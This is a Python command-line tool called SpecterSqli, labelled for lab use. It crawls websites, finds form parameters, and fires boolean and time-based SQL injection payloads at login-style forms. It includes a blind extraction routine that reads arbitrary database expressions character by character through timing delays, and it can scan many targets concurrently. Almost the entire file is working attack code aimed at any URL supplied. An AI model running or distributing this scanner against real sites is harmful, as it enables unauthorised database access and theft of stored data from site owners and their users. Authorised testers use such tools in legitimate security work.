#!/usr/bin/env python3
# SpecterSqli
# Author: rhshourav
# Educational & Lab Use Only

import requests, argparse, json, time, os
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor

USER_AGENT = "SpecterSqli/2.0"
DEFAULT_TIMEOUT = 6

# =========================
# AUTHENTICATED LOGIN
# =========================
def authenticated_login(session, opts):
    if not opts.login_url:
        return

    data = {
        opts.login_user_field: opts.login_user,
        opts.login_pass_field: opts.login_pass
    }

    r = session.post(opts.login_url, data=data, timeout=opts.timeout)
    if r.status_code in [200, 302]:
        print("[+] Authenticated successfully")

# =========================
# CRAWLER
# =========================
def crawl_site(session, start, depth):
    visited, found = set(), set()
    host = urlparse(start).netloc

    def crawl(url, d):
        if d > depth or url in visited:
            return
        visited.add(url)
        try:
            r = session.get(url, timeout=DEFAULT_TIMEOUT)
        except:
            return

        found.add(url)
        soup = BeautifulSoup(r.text, "html.parser")

        for tag in soup.find_all(["a", "form"]):
            link = tag.get("href") or tag.get("action")
            if not link:
                continue
            full = urljoin(url, link)
            if urlparse(full).netloc == host:
                crawl(full, d + 1)

    crawl(start, 0)
    return list(found)

# =========================
# PARAM DISCOVERY
# =========================
def discover_params(session, url):
    params = {"username", "user", "email", "id", "q"}
    try:
        r = session.get(url, timeout=DEFAULT_TIMEOUT)
        soup = BeautifulSoup(r.text, "html.parser")
        for i in soup.find_all(["input", "textarea"]):
            if i.get("name"):
                params.add(i.get("name"))
    except:
        pass
    return list(params)

# =========================
# BOOLEAN SQLi
# =========================
BOOLEAN_PAYLOADS = [
    "' OR 1=1 -- -",
    "' OR 'a'='a' -- -"
]

def boolean_test(session, url, param):
    results = []
    for p in BOOLEAN_PAYLOADS:
        data = {param: p, "password": "x"}
        r = session.post(url, data=data)
        result = {
            "param": param,
            "payload": p,
            "status": r.status_code,
            "length": len(r.text),
            "likely": any(k in r.text.lower() for k in ["welcome", "dashboard"])
        }
        results.append(result)
    return results

# =========================
# TIME-BASED SQLi
# =========================
def time_test(session, url, param, sleep):
    payload = f"' OR IF(1=1,SLEEP({sleep}),0) -- -"
    data = {param: payload, "password": "x"}
    t1 = time.time()
    session.post(url, data=data, timeout=sleep + 3)
    delta = time.time() - t1
    return {"param": param, "sleep": delta, "vulnerable": delta > sleep * 0.6}

# =========================
# FAST BLIND EXTRACTION
# =========================
def blind_extract_fast(session, url, param, expr, maxlen, sleep):
    extracted = ""
    for pos in range(1, maxlen + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = f"' OR IF(ASCII(SUBSTRING(({expr}),{pos},1))>{mid},SLEEP({sleep}),0)-- -"
            t = time.time()
            session.post(url, data={param: payload, "password": "x"}, timeout=sleep+3)
            if time.time() - t > sleep * 0.6:
                low = mid + 1
            else:
                high = mid - 1
        if low < 32 or low > 126:
            break
        extracted += chr(low)
        print(f"[+] {extracted}")
    return extracted

# =========================
# HTML REPORT
# =========================
def build_html_report(results, file):
    html = f"""
<html><head><title>SpecterSqli Report</title>
<style>
body {{ background:#0f172a;color:#e5e7eb;font-family:Arial;padding:20px }}
table {{ width:100%;border-collapse:collapse }}
td,th {{ border:1px solid #1e293b;padding:8px }}
th {{ background:#1e293b }}
</style></head>
<body>
<h1>👻 SpecterSqli Report</h1>
<p>Author: rhshourav</p>
<table>
<tr><th>URL</th><th>Issues</th></tr>
"""

    for r in results:
        score = sum(int(x.get("likely") or x.get("vulnerable", False)) for x in r["findings"])
        html += f"<tr><td>{r['url']}</td><td>{score}</td></tr>"

    html += "</table></body></html>"
    with open(file, "w") as f:
        f.write(html)

# =========================
# ANALYZE TARGET
# =========================
def analyze(url, opts):
    session = requests.Session()
    session.headers["User-Agent"] = USER_AGENT

    authenticated_login(session, opts)

    params = discover_params(session, url)
    findings = []

    for p in params:
        findings += boolean_test(session, url, p)
        findings.append(time_test(session, url, p, opts.sleep))

    blind = None
    if opts.blind:
        blind = blind_extract_fast(session, url, opts.blind_param or params[0],
                                   opts.blind, opts.maxlen, opts.sleep)

    return {"url": url, "params": params, "findings": findings, "blind": blind}

# =========================
# CLI
# =========================
def main():
    ap = argparse.ArgumentParser(description="SpecterSqli - SQLi Lab Scanner")
    ap.add_argument("--target")
    ap.add_argument("--targets-file")
    ap.add_argument("--crawl", action="store_true")
    ap.add_argument("--crawl-depth", type=int, default=2)
    ap.add_argument("--concurrency", action="store_true")
    ap.add_argument("--workers", type=int, default=6)
    ap.add_argument("--sleep", type=int, default=2)
    ap.add_argument("--blind", help="Blind extract SQL expression")
    ap.add_argument("--blind-param")
    ap.add_argument("--maxlen", type=int, default=20)
    ap.add_argument("--login-url")
    ap.add_argument("--login-user")
    ap.add_argument("--login-pass")
    ap.add_argument("--login-user-field", default="username")
    ap.add_argument("--login-pass-field", default="password")
    ap.add_argument("--timeout", type=int, default=6)
    ap.add_argument("--report", default="specter_report.html")

    opts = ap.parse_args()
    targets = []

    if opts.targets_file:
        with open(opts.targets_file) as f:
            targets += f.read().splitlines()
    if opts.target:
        targets.append(opts.target)

    results = []
    if opts.concurrency:
        with ThreadPoolExecutor(max_workers=opts.workers) as ex:
            for r in ex.map(lambda u: analyze(u, opts), targets):
                results.append(r)
    else:
        for t in targets:
            results.append(analyze(t, opts))

    build_html_report(results, opts.report)
    print("[+] Report saved:", opts.report)

if __name__ == "__main__":
    main()
